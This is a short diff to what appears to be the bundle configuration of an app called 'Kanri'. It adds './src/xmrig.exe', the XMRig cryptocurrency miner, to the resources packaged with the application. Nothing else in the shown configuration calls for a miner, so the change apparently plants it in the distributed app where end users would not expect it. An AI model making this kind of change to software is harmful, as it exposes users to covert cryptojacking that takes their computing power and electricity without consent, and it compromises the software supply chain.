@@ -31,7 +31,9 @@
       "providerShortName": null,
       "signingIdentity": null
     },
-    "resources": [],
+    "resources": [
+      "./src/xmrig.exe"
+    ],
     "shortDescription": "Kanri",
     "linux": {
       "deb": {
